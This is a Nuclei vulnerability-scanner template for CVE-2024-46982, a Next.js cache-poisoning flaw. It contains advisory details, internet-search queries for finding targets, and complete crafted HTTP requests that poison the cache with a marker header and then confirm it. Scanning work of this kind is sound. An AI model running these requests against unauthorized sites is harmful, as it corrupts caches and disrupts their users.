id: CVE-2024-46982

info:
  name: Next.js - Cache Poisoning
  author: melmathari
  severity: high
  description: |
    Next.js is a React framework for building full-stack web applications. By sending a crafted HTTP request, it is possible to poison the cache of a non-dynamic server-side rendered route in the pages router (this does not affect the app router). When this crafted request is sent it could coerce Next.js to cache a route that is meant to not be cached and send a `Cache-Control- s-maxage=1, stale-while-revalidate` header which some upstream CDNs may cache as well. To be potentially affected all of the following must apply- 1. Next.js between 13.5.1 and 14.2.9, 2. Using pages router, & 3. Using non-dynamic server-side rendered routes e.g. `pages/dashboard.tsx` not `pages/blog/[slug].tsx`. This vulnerability was resolved in Next.js v13.5.7, v14.2.10, and later. We recommend upgrading regardless of whether you can reproduce the issue or not. There are no official or recommended workarounds for this issue, we recommend that users patch to a safe version.
  reference:
    - https://github.com/vercel/next.js/security/advisories/GHSA-gp8f-8m3g-qvj9
    - https://nvd.nist.gov/vuln/detail/CVE-2024-46982
    - https://github.com/vercel/next.js/commit/7ed7f125e07ef0517a331009ed7e32691ba403d3
    - https://github.com/vercel/next.js/commit/bd164d53af259c05f1ab434004bcfdd3837d7cda
    - https://github.com/20142995/nuclei-templates
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
    cvss-score: 7.5
    cve-id: CVE-2024-46982
    cwe-id: CWE-639
    epss-score: 0.52473
    epss-percentile: 0.97779
  metadata:
    verified: true
    max-request: 3
    vendor: vercel
    product: next.js
    shodan-query:
      - http.html:"next.js"
      - cpe:"cpe:2.3:a:zeit:next.js"
      - http.html:"/_next/static"
      - x-middleware-rewrite
    fofa-query:
      - 'body="next.js" || header="x-powered-by: next.js"'
      - body="/_next/static"
      - x-middleware-rewrite
  tags: cve,cve2024,nextjs,cache,poisoning

flow: http(1) || (http(2) && http(3) && http(4))

variables:
  cache-buster: "{{rand_text_alpha(10)}}"

http:
  - raw:
      - |
        GET /dashboard HTTP/1.1
        Host: {{Hostname}}
        X-Now-Route-Matches: -1

    matchers:
      - type: word
        part: header
        words:
          - "Cache-Control"
          - "s-maxage=1"
          - "stale-while-revalidate"
        condition: and

  - method: GET
    path:
      - "{{BaseURL}}"

    matchers:
      - type: word
        part: body
        words:
          - '"buildId":'
        internal: true

    extractors:
      - type: regex
        part: body
        name: buildId
        group: 1
        regex:
          - '"buildId":"([^"]+)"'
        internal: true

      - type: regex
        part: body
        name: routes
        group: 1
        regex:
          - '"page":"(/[^"]*)"'
        internal: true

  - raw:
      - |
        GET /_next/data/{{buildId}}{{routes}}.json?cb={{cache-buster}} HTTP/1.1
        Host: {{Hostname}}
        User-Agent: nuclei-cve-2024-46982-FIXED-POISON-MARKER

    max-redirects: 2

    matchers:
      - type: dsl
        dsl:
          - 'contains(content_type, "application/json")'
          - 'contains_all(body, "nuclei-cve-2024-46982-FIXED-POISON-MARKER","pageProps","__N_SSP")'
        condition: and
        internal: true

  - raw:
      - |
        GET /_next/data/{{buildId}}{{routes}}.json?cb={{cache-buster}} HTTP/1.1
        Host: {{Hostname}}

    max-redirects: 2

    matchers:
      - type: dsl
        dsl:
          - 'contains(content_type, "application/json")'
          - 'contains_all(body, "nuclei-cve-2024-46982-FIXED-POISON-MARKER","pageProps","__N_SSP")'
        condition: and

    extractors:
      - type: regex
        part: body
        regex:
          - '"userAgent":"([^"]+)"'
